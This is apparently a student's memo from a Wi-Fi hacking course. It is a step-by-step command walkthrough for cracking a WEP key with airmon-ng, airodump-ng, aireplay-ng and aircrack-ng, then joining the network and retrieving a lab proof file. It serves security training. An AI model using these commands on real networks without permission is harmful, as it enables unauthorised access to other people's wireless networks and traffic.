# WiFi_Hacking_Memo
Quick notes taken from the course around WiFi hacking
## WEP
1.	Place the wireless interface in monitor mode using the Airmon-ng tool
```
sudo airmon-ng start wlan0
```
2.	Discover nearby WiFi networks using Airodump-ng tool
```
sudo airodump-ng wlan0mon --wps
```
3.	Perform a targeted scan with the AP BSSID and channel discovered from step 2, and redirect the capture to a file named ‘WEP’
```
sudo airodump-ng -c 11 -b XX:XX:XX:XX:XX:XX -w WEP wlan0mon
```
4.	When the above command in step 3 shows at least 1 connected station to the AP, open a new terminal tab and sent ARP replay packets to the said station using Aireplay-ng, by specifying the targeted station ID
```
sudo aireplay-ng -3 -b XX:XX:XX:XX:XX:XX -h XX:XX:XX:XX:XX:XX wlan0mon
```
5.	Back on the previous tab, where Airodump-ng is still running and capturing traffic, the tool should have captured the handshake successfully. Stop Airodump-ng by pressing the CTRL + C keys and stop the monitor mode for the interface
```
sudo airmon-ng stop wlan0
```
6.	Use Aircrack-ng to crack the key from the output file created by Airodump-ng
```
sudo aircrack-ng WEP01.cap
```
7.	Once the key is cracked by Aircrack-ng, use iwconfig to connect the compromised wireless network
```
sudo iwconfig wlan0 essid <SSID_name> key <KEY>
```
8.	Refresh the DHCP client configuration and obtain an IP from the AP
```
sudo dhclient wlan0
```
9.	Get the content of the proof.txt file
```
curl http://192.168.1.1/proof.txt
```
